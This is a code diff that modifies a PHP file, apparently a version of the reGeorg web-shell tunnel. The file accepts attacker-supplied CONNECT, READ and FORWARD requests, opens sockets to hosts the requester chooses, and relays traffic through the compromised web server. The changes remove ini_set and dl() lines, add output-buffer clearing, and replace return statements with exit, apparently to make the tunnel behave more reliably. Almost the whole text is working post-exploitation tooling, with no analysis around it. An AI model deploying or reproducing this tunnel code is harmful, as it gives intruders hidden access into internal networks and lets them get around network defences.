@@ -25,9 +25,7 @@ For more information, see:
 https://github.com/sensepost/reGeorg
 */
 
-ini_set("allow_url_fopen", true);
-ini_set("allow_url_include", true);
-dl("php_sockets.dll");
+@ob_clean();
 
 if( !function_exists('apache_request_headers') ) {
     function apache_request_headers() {
@@ -71,14 +69,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 				{
 					header('X-STATUS: FAIL');
 					header('X-ERROR: Failed creating socket');
-					return;
+					exit;
 				}
 				$res = @socket_connect($sock, $target, $port);
                 if ($res === false)
 				{
 					header('X-STATUS: FAIL');
 					header('X-ERROR: Failed connecting to target');
-					return;
+					exit;
 				}
 				socket_set_nonblock($sock);
 				@session_start();
@@ -142,7 +140,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 				@session_start();
 				$_SESSION["run"] = false;
 				session_write_close();
-				return;
+				exit;
 			}
 			break;
 		case "READ":
@@ -156,11 +154,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 					header('X-STATUS: OK');
                     header("Connection: Keep-Alive");
 					echo $readBuffer;
-					return;
+					exit;
 				} else {
                     header('X-STATUS: FAIL');
                     header('X-ERROR: RemoteSocket read filed');
-					return;
+					exit;
 				}
 			}
 			break;
@@ -172,7 +170,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 if(!$running){
                     header('X-STATUS: FAIL');
 					header('X-ERROR: No more running, close now');
-                    return;
+                    exit;
                 }
                 header('Content-Type: application/octet-stream');
 				$rawPostData = file_get_contents("php://input");
@@ -182,7 +180,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 					session_write_close();
 					header('X-STATUS: OK');
                     header("Connection: Keep-Alive");
-					return;
+					exit;
 				} else {
 					header('X-STATUS: FAIL');
 					header('X-ERROR: POST request read filed');
@@ -191,4 +189,4 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 			break;
 	}
 }
-?>
+exit;
